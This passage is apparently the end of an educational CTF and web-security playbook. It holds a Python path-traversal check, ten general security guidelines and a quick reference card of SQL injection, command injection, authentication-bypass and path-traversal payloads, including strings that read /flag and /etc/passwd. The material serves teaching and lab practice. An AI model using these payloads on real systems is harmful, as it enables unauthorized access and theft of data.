    full_path = os.path.abspath(os.path.join(BASE_DIR, user_path))
    
    # Ensure it's within BASE_DIR
    if not full_path.startswith(BASE_DIR):
        raise ValueError("Path traversal detected")
    
    return full_path
```

### 9.5 General Security Guidelines

1. **Never trust user input** - Validate and sanitize everything
2. **Use parameterized queries** for all database operations
3. **Avoid shell commands** when possible
4. **Use server-side sessions** instead of trusting client data
5. **Implement proper authentication** with session tokens
6. **Use HTTPS** to prevent man-in-the-middle attacks
7. **Keep dependencies updated** to patch known vulnerabilities
8. **Use Content Security Policy (CSP)** headers
9. **Implement rate limiting** to prevent brute force attacks
10. **Log and monitor** suspicious activities

---

## Quick Reference Card

### SQL Injection Payloads
```bash
# Basic bypass
admin' --
admin' OR 1=1 --
admin' OR '1'='1
admin' AND 1=1 --

# UNION injection
admin" UNION SELECT password FROM users --
admin" UNION SELECT name FROM sqlite_master --
admin" UNION SELECT sql FROM sqlite_master WHERE type="table" --

# Blind injection
admin' AND SUBSTR(password,1,1)='f' --
admin' OR (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='f' --
```

### Command Injection Payloads
```bash
# Command separators
; cat /flag
&& cat /flag
|| cat /flag
| cat /flag
%0Acat%20/flag

# Space bypass
cat${IFS}/flag
cat%09/flag
cat{,,}/flag

# Command substitution
$(cat /flag)
`cat /flag`
```

### Authentication Bypass
```bash
# URL parameter
?session_user=admin

# Cookie
Cookie: session_user=admin

# SQL injection
username=admin' --
password=' OR 1=1 --
```

### Path Traversal
```bash
# Basic traversal
../../../flag
../../../../etc/passwd

# Encoded traversal
%2e%2e%2f%2e%2e%2f%2e%2e%2fflag
%252e%252e%252fflag
..%2f..%2f..%2fflag
```

---

## License

This playbook is for educational purposes only. Use responsibly and only on systems you have permission to test.

---

**Happy Hacking! 🚀**
